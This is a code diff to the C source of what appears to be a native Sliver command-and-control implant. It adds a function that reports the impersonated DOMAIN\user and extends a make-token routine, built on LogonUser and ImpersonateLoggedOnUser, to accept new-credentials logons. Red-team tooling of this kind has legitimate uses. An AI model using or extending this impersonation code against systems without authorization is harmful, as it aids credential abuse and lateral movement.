@@ -6,6 +6,7 @@
 #include <windows.h>
 
 #include <stdio.h>
+#include <stdlib.h>
 #include <string.h>
 
 /* LogonUser + ImpersonateLoggedOnUser, same shape as the Go implant. */
@@ -13,15 +14,72 @@ static unsigned long g_token_error = 0;
 
 unsigned long sliver_token_last_error(void) { return g_token_error; }
 
+/* DOMAIN\user of the token this thread is currently running as (falls back to
+ * the process token). The Go implant reports the same shape; getenv("USERNAME")
+ * used to return a bare user name that did not change after make-token. */
+int sliver_token_owner(char *out, size_t cap) {
+  HANDLE token = NULL;
+  DWORD needed = 0;
+  char *buf = NULL;
+  TOKEN_USER *user;
+  char name[256];
+  char domain[256];
+  DWORD name_len = (DWORD)sizeof(name);
+  DWORD domain_len = (DWORD)sizeof(domain);
+  SID_NAME_USE type;
+
+  if (out == NULL || cap == 0) {
+    return -1;
+  }
+  out[0] = '\0';
+  if (!OpenThreadToken(GetCurrentThread(), TOKEN_QUERY, TRUE, &token)) {
+    if (!OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &token)) {
+      return -1;
+    }
+  }
+  (void)GetTokenInformation(token, TokenUser, NULL, 0, &needed);
+  if (needed == 0) {
+    (void)CloseHandle(token);
+    return -1;
+  }
+  buf = (char *)malloc(needed);
+  if (buf == NULL) {
+    (void)CloseHandle(token);
+    return -1;
+  }
+  if (!GetTokenInformation(token, TokenUser, buf, needed, &needed)) {
+    free(buf);
+    (void)CloseHandle(token);
+    return -1;
+  }
+  user = (TOKEN_USER *)buf;
+  if (!LookupAccountSidA(NULL, user->User.Sid, name, &name_len, domain, &domain_len, &type)) {
+    free(buf);
+    (void)CloseHandle(token);
+    return -1;
+  }
+  if (domain[0] != '\0') {
+    (void)snprintf(out, cap, "%s\\%s", domain, name);
+  } else {
+    (void)snprintf(out, cap, "%s", name);
+  }
+  free(buf);
+  (void)CloseHandle(token);
+  return 0;
+}
+
 int sliver_make_token(const char *username, const char *password, const char *domain,
                       uint32_t logon_type) {
   HANDLE token = NULL;
   BOOL ok;
   DWORD type = (DWORD)logon_type;
-  /* Only LOGON32 types LogonUser accepts; anything else yields Win32 1367. */
+  /* LogonUser accepts these; the sliver client sends
+   * LOGON_NEW_CREDENTIALS (9) for the "net use"-style case, which used to be
+   * rewritten to INTERACTIVE and silently changed the operator's intent. */
   if (type != LOGON32_LOGON_INTERACTIVE && type != LOGON32_LOGON_NETWORK &&
       type != LOGON32_LOGON_BATCH && type != LOGON32_LOGON_SERVICE &&
-      type != LOGON32_LOGON_UNLOCK && type != LOGON32_LOGON_NETWORK_CLEARTEXT) {
+      type != LOGON32_LOGON_UNLOCK && type != LOGON32_LOGON_NETWORK_CLEARTEXT &&
+      type != LOGON32_LOGON_NEW_CREDENTIALS) {
     LOG_DEBUG("token: logon type %lu not supported by LogonUser, using INTERACTIVE",
               (unsigned long)type);
     type = LOGON32_LOGON_INTERACTIVE;
